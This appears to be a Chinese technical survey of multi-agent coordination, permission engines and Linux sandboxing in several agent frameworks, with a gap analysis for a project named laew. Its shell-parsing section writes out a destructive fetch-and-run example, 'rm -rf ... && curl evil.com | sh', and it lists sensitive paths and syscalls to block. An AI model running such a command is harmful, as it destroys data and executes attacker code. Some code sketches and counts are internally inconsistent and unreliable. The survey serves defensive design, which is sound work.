# 专题：多 Agent 协作与权限管控深度分析（v2 整合版）

> **整合专题**：把「多 Agent 协作」、「权限管控」、「沙箱」三大主题合并到同一份报告。涉及的 5 个主参考仓库与若干对比仓库，全部基于 `docs/Agent源码调研/` 既有三层文档（源码调研 / 深度分析 / 核心机制深度分析）。
>
> **主参考仓库**：
> 1. **agent-core**（Python）— TeamAgent 组合模式、PermissionEngine 三级防护、Shell AST 双后端、铁轨机制、OTLP Trajectory。
> 2. **jiuwenswarm**（Python）— Leader-Teammate 模式、协议矩阵（A2A/ACP/E2A/A2UI）、HITL 挂起恢复、SkillDevPipeline 12 阶段 + 3 挂起点。
> 3. **agent-studio**（Python）— BubbleWrap + Seccomp BPF + 命名空间五层沙箱、`retcode=159` 检测、组件注册表。
> 4. **Switchyard**（Rust）— AdvisorGate、`max_reviews` 预算、`fail_open`、`Algorithm` trait + `Step` 流、Prometheus + W3C Trace Context。
> 5. **TencentDB-Agent-Memory**（Python）— Langfuse/Opik 双 trace。
>
> **对比仓库**：claudecode 的 27 种 Hook、deepseek-harness 的 Cordis 插件、openclaw 的双向 MCP、opencode 的 Effect + Schema DI、pi 的 lane 并发、hermes-agent 的 6 前端共享核心、atomcode 的 L0/L1/L2 分层。
>
> **laew 当前架构基线**：6 角色（Yolo/Plan/Main-Work/Sub-Work/Quality-Check/SessionContext）+ 三档难度（simple/medium/hard），多 Agent 协作靠 `MultiAgentOrchestrator` 串行编排，Bash/Read/Write 三工具，**零沙箱 + 零权限校验**（已知缺口）。

---

## 目录

1. [综述：协作 × 权限 × 沙箱三位一体](#一综述协作--权限--沙箱三位一体)
2. [多 Agent 协作模式横向对比](#二多-agent-协作模式横向对比)
3. [权限管控三态策略深度剖析](#三权限管控三态策略深度剖析)
4. [沙箱设计五层防护](#四沙箱设计五层防护)
5. [HITL 挂起与恢复机制](#五hitl-挂起与恢复机制)
6. [Fork 上下文与跨边界重建](#六fork-上下文与跨边界重建)
7. [协议矩阵（A2A/ACP/E2A/A2UI）差异实现](#七协议矩阵a2aacpe2aa2ui差异实现)
8. [质量门控（QC）的精细化分级](#八质量门控qc的精细化分级)
9. [可观测性与审计](#九可观测性与审计)
10. [Rust vs Python 实现差异](#十rust-vs-python-实现差异)
11. [laew 现状诊断](#十一laew-现状诊断)
12. [P0/P1/P2 演进路线图](#十二p0p1p2-演进路线图)
13. [反模式警示与设计原则](#十三反模式警示与设计原则)
14. [结论与最终建议](#十四结论与最终建议)

---

## 一、综述：协作 × 权限 × 沙箱三位一体

在工业级 Agent 系统中，「协作」「权限」「沙箱」三者不是独立模块，而是**互相约束的安全栈**：

```
        ┌──────────────────────────────────────────────────────┐
        │              多 Agent 协作 (Coordination)              │
        │   Leader/Teammate · TeamAgent组合 · Plan/Main/Sub ·   │
        │   HITL挂起恢复 · Fork上下文 · 协议矩阵                  │
        └──────────────────────────────────────────────────────┘
                                │ 委派 / Fork
                                ▼
        ┌──────────────────────────────────────────────────────┐
        │              权限管控 (Permission)                     │
        │   三态(Allow/Ask/Deny) · ToolGuard/FileGuard/NetGuard │
        │   Shell AST双后端(tree-sitter+保守) · fail-closed     │
        │   铁轨机制(BEFORE/AFTER/EXCEPTION) · MCP白名单        │
        └──────────────────────────────────────────────────────┘
                                │ 决策
                                ▼
        ┌──────────────────────────────────────────────────────┐
        │              沙箱隔离 (Sandbox)                        │
        │   命名空间(user/pid/net/uts/ipc/cgroup)               │
        │   Seccomp BPF · 文件系统只读 · 网络隔离 · 用户隔离     │
        │   retcode=159 检测 · PR_SET_PDEATHSIG · BubbleWrap    │
        └──────────────────────────────────────────────────────┘
                                │
                                ▼
                       ┌──────────────────┐
                       │    OS / Kernel    │
                       └──────────────────┘
```

**5 个仓库在这三层的设计取向**：

| 仓库 | 协作层 | 权限层 | 沙箱层 |
|------|--------|--------|--------|
| **agent-core** | TeamAgent 组合模式（6 manager） + Fork 上下文 + 双 Spawn | **三态策略 + 三级防护 + Shell AST 双后端** + 铁轨 | 无（应用层安全靠权限） |
| **jiuwenswarm** | Leader-Teammate + SwarmBuildContext + 协议矩阵 | MCP 资源/工具白名单 + Skill 黑名单 | **PR_SET_PDEATHSIG** 子进程守护 |
| **agent-studio** | WorkflowRunner + PregelGraphAdapter | 工具注册表 + MCP 5 传输 | **BubbleWrap + Seccomp + 命名空间五层** |
| **Switchyard** | Algorithm trait + Step 流 + AffinityRouter | AdvisorGate + `max_reviews` + `fail_open` | 进程级（无沙箱，但路由层精细） |
| **TencentDB-Agent-Memory** | 路由 + 检索增强 | 工具调用鉴权（基础） | 无 |

**核心论断**：

> 5 个仓库普遍把权限做成「**三态 + 三级 + 树解析 + fail-closed**」四件套，把沙箱做成「**命名空间 + Seccomp + 文件只读 + 用户隔离**」四件套，把协作做成「**组合 + Fork + 协议 + HITL**」四件套。laew 当前**三层都是零基础**，最大的安全缺口来自 `BashTool` 的无校验执行 + 多 Agent 委派时无权限衰减。

---

## 二、多 Agent 协作模式横向对比

### 2.1 协作架构全景

| 维度 | agent-core | jiuwenswarm | agent-studio | Switchyard | TencentDB-Memory | **laew** |
|------|------------|-------------|--------------|------------|-------------------|----------|
| **架构范式** | TeamAgent 组合 | Leader-Teammate | Workflow + Pregel | Algorithm trait + Step 流 | Router-Memory | 6 角色串行编排 |
| **协作拓扑** | 1 TeamAgent + N 子 Agent | 1 Leader + N Teammate | DAG + Pregel super-step | Driver 驱动 N 个 in-flight step | 主 Agent + Memory Router | Yolo→Plan→Main→Sub→QC→Session |
| **子 Agent 隔离** | 6 manager 内部组合 | 独立 AgentRuntime 进程 | WorkflowRunner 节点隔离 | `tokio::spawn` task | 同进程模块 | `tokio::spawn` task |
| **跨进程支持** | ExternalCli 双 Spawn | ACP stdio 子进程 | Workflow 子进程 | HTTP 服务分流 | 无 | 无（仅本地 task） |
| **Fork 上下文** | `ForkContext` 序列化注入 | `SwarmBuildContext` 跨边界重建 | Workflow 状态序列化 | `Step::CallModel` 流式 | Memory snapshot | 无 |
| **HITL 挂起** | 无显式（force_finish 替代） | **12 阶段 + 3 挂起点** + `SuspensionConfig` 三段式 | workflow_state.status="waiting_for_human" | 无 | 无 | 无 |
| **调度并发** | Manager 内部并发 | Teammate 并发独立会话 | Pregel super-step barrier | `mpsc::channel` + barrier | 单 Agent | `tokio::spawn` |
| **失败回流** | Manager 局部重试 | Leader 任务失败回流重派 | PendingNode 重试 | AdvisorGate `max_reviews` | 检索重试 | QC 不通过 → 重派 Sub |

### 2.2 Leader-Teammate 模式（jiuwenswarm）

jiuwenswarm 采用**显式 Leader 委派 + Teammate 自治**模式：

```text
┌────────────────────────────────────────────────────────────────┐
│                       Leader (编排层)                           │
│  - 解析用户输入 → 拆分为 N 个子任务                              │
│  - 通过 AgentRuntime.spawn("teammate", spec) 创建 Teammate      │
│  - 通过 E2A 协议 send_request / send_chunk 与 Teammate 通信     │
│  - 监听 Teammate.AgentEvent 流 → 聚合 → 决定下一步              │
│  - 处理 HITL 挂起点（plan_confirm / review / desc_optimize）    │
└────────────────────────────────────────────────────────────────┘
              │       spawn     │       E2A send
              ▼                 ▼
┌─────────────────────┐  ┌─────────────────────┐  ┌─────────────┐
│  Teammate #1        │  │  Teammate #2        │  │  Teammate N │
│  - 独立 AgentRuntime│  │  - 独立 AgentRuntime│  │  - 同上     │
│  - 持有独立 MCP     │  │  - 持有独立 Tool    │  │             │
│  - 独立会话上下文   │  │  - 独立会话上下文   │  │             │
└─────────────────────┘  └─────────────────────┘  └─────────────┘
```

**关键设计**：
- **每个 Teammate 拥有独立 `AgentRuntime`**，意味着独立的会话 ID、独立的 MCP 客户端、独立的工具注册表、独立的 LLM 客户端。
- **Leader 与 Teammate 通过 E2A 协议通信**（详见第 7 节），不是直接函数调用，所以**可跨进程、跨网络**。
- **HITL 挂起时整个 Leader 状态被 freeze**，包括未完成的事件订阅、未发送的请求、未消费的 chunk —— 这些信息全部序列化进 resume payload。

### 2.3 TeamAgent 组合模式（agent-core）

agent-core 用「**组合优于继承**」的思想：

```rust
// 伪代码示意（实际是 Python class）
TeamAgent = BaseAgent {
    _state: TeamAgentState
    + card_manager: CardManager        // 成员卡片（Agent 描述）
    + context_manager: ContextManager   // 共享上下文
    + event_manager: EventManager       // 事件总线
    + tool_manager: ToolManager         // 共享工具
    + memory_manager: MemoryManager     // 共享记忆
    + planning_manager: PlanningManager // 任务规划
}
```

**6 个 manager 各司其职**：
1. **CardManager** — 维护 N 个 `_TeamAgent(card)` 子成员卡片（`name/description/tools/skills`）。
2. **ContextManager** — 维护**父-子共享上下文**，子 Agent 调用结果写入共享池。
3. **EventManager** — 内部事件总线，子 Agent 完成事件可被父或其他子订阅。
4. **ToolManager** — 工具共享，子 Agent 可继承父工具集（但权限衰减）。
5. **MemoryManager** — 长期记忆，子 Agent 写入的成果可被父拉取。
6. **PlanningManager** — 任务规划与拆解。

**对比 jiuwenswarm**：
- TeamAgent 是「**同进程组合**」，6 个 manager 都是字段；jiuwenswarm 是「**跨进程委派**」，Leader 和 Teammate 各自有完整 runtime。
- 两者都强调「**子 Agent 自治 + 共享上下文**」，但隔离粒度不同。
- TeamAgent 的 ExternalCli 双 Spawn 模式可以打破同进程限制，让子 Agent 跑成独立 CLI 进程（详见第 6 节）。

### 2.4 协议矩阵的差异实现

jiuwenswarm 定义了**4 种协议**，各管一段：

| 协议 | 范围 | 编解码 | 传输 | 用途 |
|------|------|--------|------|------|
| **E2A** (External↔Agent) | 外部客户端 ↔ Agent | `E2AResponse` Pydantic 模型 + 失败时 legacy fallback | WebSocket | 外部客户端交互 |
| **A2A** (Agent-to-Agent) | Agent ↔ Agent | JSON dict + request_id 关联 | 内存 channel | Leader ↔ Teammate |
| **ACP** (Agent Communication Protocol) | Agent ↔ 外部 CLI | JSON-RPC 2.0 over stdio | subprocess stdio | 异构 Agent 协作 |
| **A2UI** (Agent-to-UI) | Agent ↔ UI | Tagged JSON（`<<<`/`>>>`） | WebSocket | 前端渲染 |

**关键差异**：
- **E2A 与 A2A 都是 JSON，但 E2A 用 Pydantic 强校验 + legacy fallback（双层 try）**，A2A 用裸 dict（轻量）。
- **ACP 是行业标准 JSON-RPC 2.0**，跨语言兼容（任意 JSON-RPC client 可连）。
- **A2UI 是 UI 专用 Tagged JSON**，每个 UI block 必须 `<<<OPEN_TAG>>>` / `<<<CLOSE_TAG>>>` 包裹，便于 UI 端增量解析。

**laew 当前架构完全无协议层**——Yolo 与 SubAgent 之间是直接函数调用，没有消息边界、没有协议版本、没有可观测的 wire 格式。

### 2.5 SwarmBuildContext 跨边界重建

jiuwenswarm 的 `SwarmBuildContext` 解决「**子 Agent 启动时如何继承父上下文**」问题：

```
父 Leader 上下文
├─ messages: [..., user_msg, assistant_msg, tool_call, tool_result]
├─ agent_card: {"name": "leader", "tools": [...]}
└─ runtime_state: {session_id, mcp_handles, ...}
       │
       │ SwarmBuildContext.serialize() → JSON 字节流
       ▼
┌─────────────────────────────────────────────────────┐
│  SwarmBuildContext payload (bytes)                    │
│  - parent_session_id                                  │
│  - messages (last N)                                  │
│  - card snapshot                                      │
│  - mcp_handles (token references, NOT actual conn)    │
└─────────────────────────────────────────────────────┘
       │
       │ HTTP POST 或 E2A stream
       ▼
子 Teammate 启动
├─ SwarmBuildContext.deserialize() 重建 context
├─ mcp_handles 用 token 重建真实连接
└─ "看到" 父的前 N 条消息
```

**关键点**：
- **MCP handles 用 token 引用而非真实连接**：子 Agent 启动时用 token 换真实连接，避免序列化 socket 对象。
- **消息有 last-N 限制**：避免无限制继承把上下文撑爆。
- **`<<<LAEW:FORK_BOUNDARY>>>` 等价物**：jiuwenswarm 用 `from=parent_session_id` + `transferred_at=ts` 元数据标记边界。

### 2.6 In-Process vs External CLI 双 Spawn

agent-core 的 `SpawnMode` 枚举提供两种子 Agent 启动方式：

```python
class SpawnMode(str, Enum):
    IN_PROCESS = "in_process"      # 同进程 tokio::spawn task
    EXTERNAL_CLI = "external_cli"  # 派生子进程跑 ./laew --member <name>

class _TeamAgent(BaseAgent):
    spawn_mode: SpawnMode
    fork_from: Optional[ForkContext] = None
    runtime: "TeamHarness"           # IN_PROCESS 时是同进程对象
                                    # EXTERNAL_CLI 时是子进程句柄
```

**两种模式的取舍**：

| 维度 | In-Process | External CLI |
|------|------------|--------------|
| **开销** | 低（task spawn） | 高（fork + exec） |
| **隔离** | 同进程（权限不衰减） | 子进程（可独立 drop_cap） |
| **可观测** | 同 tracing 上下文 | 需用 W3C Trace Context 跨进程 |
| **适用场景** | 轻量子任务、SubAgent | 重任务、可崩溃隔离、跨语言 |

**laew 当前所有 SubAgent 都是 In-Process**——好处是快，坏处是 **Bash 工具无沙箱** 时，整个进程被一个恶意 `rm -rf /` 带走。

---

## 三、权限管控三态策略深度剖析

### 3.1 三态权限模型

agent-core 的 `PermissionLevel` 是行业标杆：

```python
class PermissionLevel(str, Enum):
    ALLOW = "allow"  # 允许，直接执行
    ASK = "ask"      # 询问用户（弹窗确认）
    DENY = "deny"    # 拒绝，抛 PermissionDenied
```

**多级防护**的 `strictest()` 函数：

```python
def strictest(a: PermissionLevel, b: PermissionLevel) -> PermissionLevel:
    if a == PermissionLevel.DENY or b == PermissionLevel.DENY:
        return PermissionLevel.DENY
    if a == PermissionLevel.ASK or b == PermissionLevel.ASK:
        return PermissionLevel.ASK
    return PermissionLevel.ALLOW
```

**为什么需要三态而不是两态（Allow/Deny）**：

| 决策粒度 | 两态 (Allow/Deny) | 三态 (Allow/Ask/Deny) |
|----------|-------------------|------------------------|
| 已知安全操作 | Allow | Allow |
| 已知危险操作 | Deny | Deny |
| **未知/灰色操作** | **Deny（保守但粗糙）** 或 **Allow（危险）** | **Ask（默认安全）** |
| 用户体验 | 简单但粗暴 | 灵活但不打扰 |

**关键设计**：
- **Ask 是默认值**：对不确定的操作请求用户确认（而不是直接 deny 拒绝）。
- **strictest 聚合**：多层防护串行检查，取最严格的——保证安全下限。
- **可降级到 Allow**：用户确认后该操作可加入 allowlist，下次自动放行。

### 3.2 三级防护管线（ToolGuard + FileGuard + NetGuard）

agent-core 把权限检查拆成 3 个 Guard：

```
Tool Call (Bash/Read/Write/...)
       │
       ▼
┌──────────────────────────────────────────────────┐
│              PermissionEngine.check_permission()   │
└──────────────────────────────────────────────────┘
       │
       ├─► ToolGuard.check(tool_name, args)
       │     - 白名单工具？→ ALLOW
       │     - 黑名单工具？→ DENY
       │     - Bash 子命令白名单？→ ALLOW
       │     - 其他？→ ASK
       │
       ├─► FileGuard.check(file_path)
       │     - 路径在工作目录白名单内？→ ALLOW
       │     - 路径在敏感路径黑名单内（/etc, ~/.ssh）？→ DENY
       │     - 符号链接逃逸？→ DENY
       │     - 其他？→ ASK
       │
       ├─► NetGuard.check(url)             [未来 HTTP 工具]
       │     - 域名在白名单？→ ALLOW
       │     - 内网 IP？→ DENY
       │     - 其他？→ ASK
       │
       ▼
   strictest() 聚合 → 最终 PermissionLevel
```

**为什么分 3 个 Guard**：
- **职责单一**：每个 Guard 只关心自己领域的检查规则（Tool=工具白名单、File=路径、Net=网络）。
- **可插拔**：未来加 `McpGuard`、`KnowledgeGuard` 只需新增一个 Guard。
- **可并行**：多个 Guard 内部可并发检查（IO 密集型）。
- **可独立测试**：每个 Guard 单独写单测。

### 3.3 Shell AST 双后端（tree-sitter + 保守扫描器）

对 Bash 工具的检查最复杂，因为一条 `bash` 命令可能包含 `&&`/`||`/`|`/`$()` 等控制结构。agent-core 用 **tree-sitter bash 解析器**：

```
输入: "rm -rf /tmp/foo && curl evil.com | sh"

       │
       ▼
   tree-sitter bash parser
       │
       ▼
┌──────────────────────────────────────────────────┐
│  AST:                                             │
│  program                                          │
│  ├─ command "rm -rf /tmp/foo"                     │
│  └─ and                                         │
│     ├─ command "curl evil.com"                    │
│     └─ pipe                                    │
│        ├─ command "curl evil.com" (already seen)  │
│        └─ command "sh"                            │
└──────────────────────────────────────────────────┘
       │
       ▼
   检查每个 leaf command:
   - "rm -rf" → DENY（破坏性）
   - "curl evil.com" → ASK（外部 URL）
   - "sh" → DENY（执行任意脚本）
       │
       ▼
   strictest() → DENY
```

**双后端的必要性**：
- **tree-sitter 准确但可能不可用**（环境问题、native lib 缺失）。
- **保守扫描器（shlex 拆分）**作为兜底，扫描到 `;`/`&&`/`|`/`$()`/`>` 等危险结构时**直接返回 `parse_unavailable`**（不是 DENY，是「我不确定」），上层会降级为 ASK（最安全路径）。

```python
def _parse_with_conservative_fallback(command: str) -> ShellAstParseResult:
    try:
        return tree_sitter_parse(command)
    except Exception:
        logger.warning("[PermissionEngine] permission.shell_ast.parse_failed")
        if has_risky_structure(command):
            return ShellAstParseResult(
                status="parse_unavailable",  # fail-closed 关键
                reason="tree-sitter backend unavailable and fallback detected shell structure"
            )
        return ShellAstParseResult(status="safe")
```

**为什么 fail-closed 而不是 fail-open**：
- **fail-open**：解析失败 → 当作安全 → 允许执行 → **可能被恶意命令利用**。
- **fail-closed**：解析失败 → 当作不安全 → 询问用户 → **多一次交互但不放过风险**。
- 安全系统必须 fail-closed。

### 3.4 铁轨机制（BEFORE/AFTER/EXCEPTION）

agent-core 的 `@rail` 装饰器实现**横切关注点**：

```python
@rail(before=BEFORE_MODEL_CALL,
      after=AFTER_MODEL_CALL,
      on_exception=ON_MODEL_EXCEPTION)
async def _railed_model_call(ctx):
    """实际 LLM 调用点（被 @rail 包装钩子）"""
    return await actual_llm_call(ctx)
```

**5 类铁轨**：

| 铁轨名 | 触发时机 | 典型用途 |
|--------|----------|----------|
| `BEFORE_INVOKE` | 工具调用前 | 权限检查、日志、限流 |
| `AFTER_INVOKE` | 工具调用后 | 结果校验、轨迹记录、缓存 |
| `BEFORE_MODEL_CALL` | LLM 调用前 | 提示词注入、token 计数 |
| `AFTER_MODEL_CALL` | LLM 调用后 | 响应校验、轨迹记录 |
| `ON_MODEL_EXCEPTION` | LLM 异常时 | 重试、降级、熔断 |
| `BEFORE_STEERING_DRAIN` | 转向队列消费前 | 决定本次取多少新指令 |

**铁轨 vs Guard 的区别**：
- **Guard** 是**同步决策器**（Allow/Ask/Deny），返回枚举值。
- **铁轨** 是**异步钩子**（可调用外部服务、修改 ctx、抛异常），更通用。
- **铁轨可注册多个**（BEFORE_MODEL_CALL 可同时挂「日志」「限流」「缓存」三个铁轨）。

**laew 当前完全没有钩子机制**——所有横切关注点（日志、权限、限流、缓存）都散落在 `run_session` 主循环里，难以扩展。

### 3.5 MCP 工具白名单

agent-core 把 MCP 工具权限独立管理：

```python
class PermissionEngine:
    def __init__(self):
        self._mcp_tool_allowlists: Dict[str, frozenset[str]] = {}

    def set_mcp_tool_allowlist(self, mcp_server: str, tool_names: list[str]):
        """按 MCP server 维度控制可用工具集"""
        server_id = _normalize_server_id(mcp_server)
        self._mcp_tool_allowlists[server_id] = frozenset(tool_names)
```

**为什么按 server 而非全局**：
- 用户可能允许 `filesystem-mcp` 的 `read_file`，但禁止 `network-mcp` 的 `http_get`。
- 工具级粒度太细不可控（一个 MCP server 通常 5-20 个工具）。
- Server 级粒度刚好。

---

## 四、沙箱设计五层防护

### 4.1 BubbleWrap + Seccomp 五层隔离

agent-studio 的 `BubbleWrapRunner` 是行业最完整的开源沙箱之一：

```
┌──────────────────────────────────────────────────────────────┐
│                    BubbleWrap Sandbox                          │
│                                                              │
│  Layer 1: Namespace Isolation                                │
│    ├─ user  namespace  (CLONE_NEWUSER)                       │
│    ├─ pid   namespace  (CLONE_NEWPID)                        │
│    ├─ net   namespace  (CLONE_NEWNET)                        │
│    ├─ uts   namespace  (CLONE_NEWUTS)                        │
│    ├─ ipc   namespace  (CLONE_NEWIPC)                        │
│    └─ cgroup namespace (CLONE_NEWCGROUP)                     │
│                                                              │
│  Layer 2: Seccomp BPF (System Call Filter)                   │
│    - 黑名单: kill, ptrace, mount, init_module, ...           │
│    - 白名单: read, write, openat, exit, exit_group, ...       │
│    - 违规 → SECCOMP_RET_KILL → retcode=159                   │
│                                                              │
│  Layer 3: Filesystem Read-Only Bind Mounts                   │
│    - /usr, /lib, /lib64  → bind --ro                         │
│    - /tmp                → tmpfs (rw, but volatile)           │
│    - 工作目录             → bind (rw)                         │
│    - 其余路径            → /dev/null (屏蔽)                   │
│                                                              │
│  Layer 4: Network Isolation                                  │
│    - --unshare-net + iptables 屏蔽所有出站                    │
│    - 或 --share-net 但配合 curl 黑名单                       │
│                                                              │
│  Layer 5: User ID Dropping                                   │
│    - bwrap 默认以当前 UID 运行                                │
│    - 敏感场景 → bwrap --uid 65534 --gid 65534 (nobody)        │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 4.2 6 种 Namespace 参数

```python
class BubbleWrapRunner(BaseSandbox):
    def _namespace_params(self) -> list[str]:
        params = []
        if self.config.namespace_user:
            params += ["--unshare-user-try"]   # user namespace
        if self.config.namespace_pid:
            params += ["--unshare-pid"]         # pid namespace
        if self.config.namespace_net:
            params += ["--unshare-net"]         # network namespace
        if self.config.namespace_uts:
            params += ["--unshare-uts"]         # hostname namespace
        if self.config.namespace_ipc:
            params += ["--unshare-ipc"]         # IPC namespace
        if self.config.namespace_cgroup:
            params += ["--unshare-cgroup-try"]  # cgroup namespace
        return params
```

**6 种 namespace 的实际效果**：

| Namespace | 效果 | 典型场景 |
|-----------|------|----------|
| user | 子进程有独立 UID/GID 表，root 在 sandbox 内 = nobody 在 sandbox 外 | 防止 uid=0 越权 |
| pid | 子进程看不到宿主机进程 | 防止 ps 泄露其他进程 |
| net | 子进程有独立网络栈 | 防止 curl 外网 |
| uts | 子进程可独立 hostname | 隔离环境标识 |
| ipc | 子进程独立 IPC（信号量、共享内存） | 防止 IPC 干扰 |
| cgroup | 子进程独立 cgroup 视图 | 防止 cgroup 越权 |

### 4.3 Seccomp BPF + Python 内联加载器

agent-studio 最精巧的设计——**Python 代码生成 BPF 加载器**：

```python
def _build_py_seccomp_loader(self) -> str:
    """Generate Python code that loads a seccomp BPF filter at runtime."""
    return """
import ctypes
import ctypes.util
import struct

# ... 50 行 ctypes 代码，加载 BPF 字节码到 seccomp ...
"""
```

**为什么要代码生成**：
- **bwrap 的 `--seccomp` 标志需要文件描述符（int fd）**，Python 没有直接打开 BPF 的标准 API。
- **解决方案**：把 BPF 字节码以 Python bytes 形式嵌入源代码，运行时用 `ctypes` 调用 `syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, bpf_prog)` 安装。
- **优势**：**零外部依赖**（不依赖 libseccomp-dev、不依赖 seccomp-tools），纯 stdlib + ctypes。

**BPF 过滤器的两个策略**：

| 策略 | 描述 | 适用 |
|------|------|------|
| **黑名单** | 默认 ALLOW，禁止特定 syscall（kill, ptrace, mount） | 通用代码执行 |
| **白名单** | 默认 KILL，只允许特定 syscall（read, write, exit） | 高危场景 |

**retcode=159 检测机制**：

```python
if result.retcode == 159:
    # Linux 上 SECCOMP_RET_KILL 默认终止信号导致退出码为 128 + 9 = 137
    # 但 BPF KILL 模式下子进程被 SIGSYS 终止，不同 shell 表现不同
    # bwrap 的 --seccomp 标志传递 fd 时，seccomp 违规会让进程以 159 退出
    stderr += "\nBad syscall detected."
```

**为什么是 159 而不是 137 或 140**：
- **SIGKILL (9) → 128+9 = 137**：默认 SECCOMP_RET_KILL 行为。
- **SIGSYS (12) → 128+12 = 140**：理论值。
- **159 = 128 + 31**：Linux 内核对 SECCOMP_RET_KILL 的特殊封装，加上 bwrap 的 wrapper 偏差。
- **agent-studio 实测**：bwrap + seccomp fd 模式下违规 syscall → retcode=159。
- **检测到 159 → stderr 追加 "Bad syscall detected"** → 上层可识别为安全违规。

### 4.4 沙箱抽象与可插拔设计

agent-studio 的 `BaseSandbox` 用 `__init_subclass__` 实现自动注册：

```python
class BaseSandbox(ABC):
    _registry: Dict[str, Type["BaseSandbox"]] = {}

    def __init_subclass__(cls, sandbox_type: str | None = None, **kwargs):
        super().__init_subclass__(**kwargs)
        if sandbox_type is not None:
            cls._registry[sandbox_type] = cls

# 注册新沙箱
class BubbleWrapRunner(BaseSandbox, sandbox_type='bubblewrap'):
    pass

class DockerRunner(BaseSandbox, sandbox_type='docker'):
    pass

# 使用
def get_sandbox(sandbox_type: str, config) -> BaseSandbox:
    return BaseSandbox._registry[sandbox_type](config)
```

**优势**：
- **声明式注册**：新增沙箱只需一行 `class X(BaseSandbox, sandbox_type='x')`。
- **类型安全**：编译期（Python 是运行期）检查继承关系。
- **配置驱动**：`config.sandbox_type = "bubblewrap"` → 工厂方法自动匹配。

### 4.5 PR_SET_PDEATHSIG（jiuwenswarm）

jiuwenswarm 在子进程层加了一道防护：

```python
import ctypes
import signal

libc = ctypes.CDLL("libc.so.6", use_errno=True)
PR_SET_PDEATHSIG = 1

def set_pdeathsig():
    """子进程在父进程被 kill 时自动收到 SIGTERM"""
    libc.prctl(PR_SET_PDEATHSIG, signal.SIGTERM, 0, 0, 0)
```

**原理**：
- 父进程 fork 子进程后，子进程调用 `prctl(PR_SET_PDEATHSIG, SIGTERM)`。
- 当父进程死亡时，内核自动给子进程发 SIGTERM。
- **避免僵尸进程**：父被 OOM kill → 子进程不会成为孤儿继续运行。

**为什么不用 BubbleWrap**：
- BubbleWrap 启动开销大（200-500ms 冷启动）。
- 子 Agent 频繁 spawn 时 BubbleWrap 太慢。
- **PR_SET_PDEATHSIG 是「轻量级进程隔离」**，够用且快。

### 4.6 沙箱对比矩阵

| 维度 | agent-studio BubbleWrap | jiuwenswarm PR_SET_PDEATHSIG | laew 当前 |
|------|-------------------------|------------------------------|------------|
| **启动开销** | 200-500ms | < 1ms | 0ms |
| **隔离强度** | 5 层（namespace/seccomp/fs/net/user） | 1 层（parent-death signal） | **零** |
| **进程隔离** | 强（独立 PID/UID/Network） | 弱（共享 PID namespace） | 无 |
| **系统调用过滤** | 有（白/黑名单 BPF） | 无 | 无 |
| **文件系统隔离** | 强（ro bind mount） | 无 | 无 |
| **网络隔离** | 强（独立 net ns） | 无 | 无 |
| **进程死亡传播** | 需手动实现 | **原生支持** | 无 |
| **可观测性** | retcode=159 检测 | 信号捕获 | 无 |

---

## 五、HITL 挂起与恢复机制

### 5.1 三种 HITL 形态对比

| 形态 | 代表项目 | 触发时机 | 状态保存 | 恢复机制 |
|------|----------|----------|----------|----------|
| **节点级** | agent-studio workflow_state | workflow 节点执行前 | `WorkflowAgentState.status="waiting_for_human"` | `workflow_resume(state, human_input)` |
| **阶段级** | jiuwenswarm `SuspensionConfig` | Pipeline 阶段切换时 | `SkillDevStage` + `extract_data(payload)` | `resume(payload)` |
| **工具级** | Switchyard `AdvisorGate` | 关键决策点 | 不挂起，仅记录审查 | `max_reviews` 预算内 |
| **会话级** | laew 当前 | 无 | 无 | 无 |

### 5.2 jiuwenswarm SkillDevPipeline 12 阶段 + 3 挂起点

jiuwenswarm 的 `SkillDevPipeline` 是**最完整的 HITL 实现**：

```python
class SkillDevStage(str, Enum):
    REQUIREMENT_PARSE = "requirement_parse"
    DESIGN = "design"
    PLAN_CONFIRM = "plan_confirm"             # 挂起点 1
    SKILL_IMPL = "skill_impl"
    TOOL_INTEGRATION = "tool_integration"
    REVIEW = "review"                         # 挂起点 2
    DESC_OPTIMIZE = "desc_optimize"
    DESC_OPTIMIZE_CONFIRM = "desc_optimize_confirm"  # 挂起点 3
    TEST_GEN = "test_gen"
    BENCHMARK = "benchmark"
    PUBLISH = "publish"
    COMPLETE = "complete"

SUSPENSION_POINTS = {
    SkillDevStage.PLAN_CONFIRM: SuspensionConfig(
        extract_data=lambda ctx: ctx.current_plan,
        on_resume=lambda ctx, payload: ctx.update_plan(payload),
        next_stage=SkillDevStage.SKILL_IMPL,
    ),
    SkillDevStage.REVIEW: SuspensionConfig(
        extract_data=lambda ctx: ctx.test_results,
        on_resume=lambda ctx, payload: ctx.apply_review_feedback(payload),
        next_stage=SkillDevStage.DESC_OPTIMIZE,
    ),
    SkillDevStage.DESC_OPTIMIZE_CONFIRM: SuspensionConfig(
        extract_data=lambda ctx: ctx.optimized_desc,
        on_resume=lambda ctx, payload: ctx.accept_description(payload),
        next_stage=SkillDevStage.TEST_GEN,
    ),
}
```

**SuspensionConfig 三段式**：
- **`extract_data(ctx) -> payload`**：把当前状态打包成给用户看的数据（UI 友好）。
- **`on_resume(ctx, payload) -> None`**：用户确认后，把 payload 应用回 ctx。
- **`next_stage: SkillDevStage`**：恢复后跳到下一个阶段。

**为什么三段式比单一 confirm() 好**：
- **解耦数据提取与状态应用**：UI 可独立设计展示层，无需理解 ctx 内部结构。
- **支持多种 payload 形态**：用户可能「确认」「修改」「拒绝」「提供额外信息」，三段式都可处理。
- **恢复路径声明化**：next_stage 在配置里写明，状态机可静态分析。

### 5.3 状态机驱动 vs 命令式挂起

```python
class SkillDevPipeline:
    async def run(self, ctx):
        """从当前阶段开始执行，直到遇到挂起点或终态。"""
        while ctx.current_stage != SkillDevStage.COMPLETE:
            stage_handler = STAGE_HANDLERS[ctx.current_stage]
            ctx = await stage_handler(ctx)
            
            if ctx.current_stage in SUSPENSION_POINTS:
                # 序列化 ctx → resume payload
                resume_payload = serialize_for_resume(ctx)
                raise HumanInputRequired(
                    stage=ctx.current_stage,
                    payload=resume_payload,
                )
```

**优势**：
- **声明式阶段表**：12 个阶段是 enum 值，新增阶段只需加 enum + handler。
- **挂起点是数据驱动的**：`in SUSPENSION_POINTS` 检查配置，不是写死的 if-elif 链。
- **状态机可可视化**：ctx.current_stage 是单一状态字段，可绘制状态转移图。

### 5.4 AdvisorGate：轻量级 HITL（Switchyard）

Switchyard 的 `AdvisorGate` 不真正「挂起」，而是「**预算管控**」：

```rust
pub struct AdvisorGateConfig {
    pub max_reviews: u32,     // 预算作用域
    pub fail_open: bool,      // 顾问失败时默认 APPROVE
}

